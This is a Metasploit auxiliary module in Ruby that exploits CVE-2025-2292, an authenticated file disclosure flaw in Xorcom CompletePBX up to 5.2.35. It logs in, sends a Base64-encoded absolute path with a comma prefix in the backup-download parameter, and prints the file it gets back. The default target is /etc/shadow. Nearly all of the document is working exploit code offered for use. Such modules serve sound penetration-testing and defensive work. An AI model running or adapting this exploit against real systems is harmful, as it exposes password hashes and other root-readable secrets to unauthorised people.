##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::XorcomCompletePbx
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Xorcom CompletePBX Authenticated File Disclosure via Backup Download',
        'Description' => %q{
          This module exploits an authenticated file disclosure vulnerability in CompletePBX <= 5.2.35.
          The issue resides in the backup download function, where user input is not properly validated,
          allowing an attacker to access arbitrary files on the system as root.

          The vulnerability is triggered by setting the `backup` parameter to a Base64-encoded
          absolute file path, prefixed by a comma `,`. This results in the server exposing the
          file contents directly.
        },
        'Author' => [
          'Valentin Lobstein' # Research and module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-2292'],
          ['URL', 'https://xorcom.com/new-completepbx-release-5-2-36-1/'],
          ['URL', 'https://chocapikk.com/posts/2025/completepbx/']
        ],
        'Privileged' => true,
        'DisclosureDate' => '2025-03-02',
        'Platform' => %w[linux unix],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for authentication']),
        OptString.new('TARGETFILE', [true, 'File to retrieve from the system', '/etc/shadow'])
      ]
    )
  end

  def check
    completepbx?
  end

  def run
    sid_cookie = completepbx_login(datastore['USERNAME'], datastore['PASSWORD'])
    encoded_path = ',' + Rex::Text.encode_base64(datastore['TARGETFILE'])

    print_status("Attempting to read file: #{datastore['TARGETFILE']} (Encoded as: #{encoded_path})")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI']),
      'method' => 'GET',
      'headers' => {
        'Cookie' => sid_cookie
      },
      'vars_get' => {
        'class' => 'core',
        'method' => 'download',
        'backup' => encoded_path
      }
    })

    fail_with(Failure::Unreachable, 'No response from target') unless res
    fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}") unless res.code == 200
    fail_with(Failure::NotVulnerable, 'No content retrieved; target not vulnerable or file empty') if res.body.to_s.empty?

    doc = res.get_html_document
    doc.at('//b[contains(text(),"Fatal error")]')

    fatal_regex = %r{\r?\n<br\s*/?>\s*<b>Fatal error}i
    content, separator, = res.body.partition(fatal_regex)
    content = res.body if separator.empty?

    print_good("Content of #{datastore['TARGETFILE']}:\n#{content.rstrip}")
  end
end
